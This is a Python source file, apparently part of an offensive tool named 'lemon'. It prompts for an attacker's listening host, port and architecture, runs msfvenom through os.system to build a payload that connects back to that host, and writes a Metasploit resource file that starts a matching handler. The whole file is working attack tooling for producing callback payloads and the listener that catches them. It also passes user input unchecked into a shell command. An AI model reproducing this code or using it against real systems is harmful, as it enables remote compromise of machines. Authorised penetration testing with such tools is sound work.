### Payload Generation ###

from colorama import Fore, Style, Back, init
import os
init()

class payload:
	def __init__(self, path, lhost, lport, arch, name):
		self.path = path
		self.lhost = lhost
		self.lport = lport
		self.arch = arch
		self.name = name
	def generate(self):
		print(f"{Style.BRIGHT}[{Fore.YELLOW}PAYLOAD{Fore.RESET}]{Style.RESET_ALL} Generating payload to {Fore.GREEN}lemon/payloads/{self.name}{Fore.RESET}...")
		print(f"\n> PAYLOAD > {str(self.path)}")
		print(f"> LHOST   > {str(self.lhost)}")
		print(f"> LPORT   > {str(self.lport)}")
		print(f"> ARCH    > {str(self.arch)}")
		print(f"> OUTPUT  > lemon/payloads/{self.name}\n")
		if self.arch == 'N/A':
			command = f"msfvenom --payload {self.path} LHOST={self.lhost} LPORT={str(self.lport)} -o payloads/{self.name}"
		else:
			command = f"msfvenom --payload {self.path} LHOST={self.lhost} LPORT={str(self.lport)} -a {self.arch} -o payloads/{self.name}"
		os.system(command)
		rpath = generateresource(self)
		print(f"{Style.BRIGHT}[{Fore.YELLOW}PAYLOAD{Fore.RESET}]{Style.RESET_ALL} Success!\nPayload: {Fore.GREEN}payloads/{self.name}{Fore.RESET}\nMSF Resource File: {Fore.GREEN}{rpath}{Fore.RESET}")
def payloadoptions(path):
	print('')
	ip = input(f'{Style.BRIGHT}[{Fore.YELLOW}LHOST{Fore.RESET}]{Style.RESET_ALL} >> ')
	port = str(input(f'{Style.BRIGHT}[{Fore.YELLOW}LPORT{Fore.RESET}]{Style.RESET_ALL}(1234) >> '))
	if port == '':
		port = '1234'
	if 'cmd' in path:
		arch = 'N/A'
	else:
		arch = str(input(f'{Style.BRIGHT}[{Fore.YELLOW}Arch{Fore.RESET}]{Style.RESET_ALL}(x86) >> '))
		if arch != 'x86' and arch != 'x64':
			arch = 'x86'
		if 'ARCH' in path:
			if arch == 'x64':
				path = path.replace('ARCH', '/x64/')
			elif arch == 'x86':
				path = path.replace('ARCH', '/')
	name = str(input(f'{Style.BRIGHT}[{Fore.YELLOW}Payload Name{Fore.RESET}]{Style.RESET_ALL} >> '))
	return payload(path, ip, port, arch, name)

def generateresource(payload):
	lines = []
	lines.append(f'use {payload.path}')
	lines.append(f'set LHOST {payload.lhost}')
	lines.append(f'set LPORT {payload.lport}')
	lines.append(f'to_handler')
	rpath = f'payloads/{payload.name}.r'
	with open(rpath, 'w') as o:
		for line in lines:
			o.write(line + '\n')
		o.close()
	return rpath
